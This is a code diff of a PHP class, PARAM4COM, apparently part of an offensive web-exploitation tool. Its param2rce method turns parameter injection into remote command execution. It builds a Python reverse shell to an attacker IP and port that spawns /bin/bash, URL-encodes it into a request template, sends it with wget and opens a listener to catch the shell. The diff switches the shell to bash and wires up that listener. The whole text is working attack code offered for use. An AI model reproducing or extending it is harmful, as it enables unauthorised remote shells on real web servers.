@@ -90,7 +90,7 @@ class PARAM4COM extends URL{
     
     public function param2rce($user_agent,$template,$cmd,$filter){ // OK
         $this->ssTitre(__FUNCTION__);
-        $shell = "/bin/sh";
+        $shell = "/bin/bash";
         $attacker_ip = $this->ip4addr4target($this->ip);
         $attacker_port = rand(1024,65535);
         
@@ -103,12 +103,15 @@ class PARAM4COM extends URL{
                 $cmd_rev_nc = $this->rev8python($attacker_ip, $attacker_port, $shell);
                 $cmd_rev_nc = $this->url2encode($cmd_rev_nc);
                 $url = $this->param2url($template, $cmd_rev_nc);
+                
                 if ($this->methode_http=="GET") $data = "wget --user-agent=\"$user_agent\" --timeout=30 --tries=2 --no-check-certificate \"$url\" -qO-  ";
                // if ($this->methode_http=="POST") $data = "wget --user-agent=\"$user_agent\" --timeout=30 --tries=2 --no-check-certificate \"$this->uri_path\" --data \"\" -qO-  ";
                 $template_rec = "wget --user-agent='$user_agent' --timeout=30 --tries=2 --no-check-certificate \"$template\" -qO-  ";               
                
-                $this->port2read(base64_encode($template_rec));
-                $this->service4lan($template_rec, $data, $attacker_port, $filter);
+                $this->port2shell(base64_encode($template_rec));
+                
+                $template_exec = str_replace("%CMD%", $cmd_rev_nc, $template_rec);
+                $this->service4lan($template_exec, base64_encode($data), $attacker_port, 'T');
                 
                 
             }
@@ -196,9 +199,9 @@ class PARAM4COM extends URL{
         $template = str_replace('%CMD%', $cmd_exec, $template);
         $template = str_replace('%NB%', $this->null_byte, $template);
         $template = str_replace('%RMT%', $this->dir_remote, $template);
-        $url = str_replace('%FILE%', $cmd_exec, $template);
-        $this->article("URL EXEC", $url);
-        return $url;
+        $template = str_replace('%FILE%', $cmd_exec, $template);
+        $this->article("TEMPLATE EXEC", $template);
+        return $template;
     }
     
     public function param2check($user2agent,$url,$filter){  
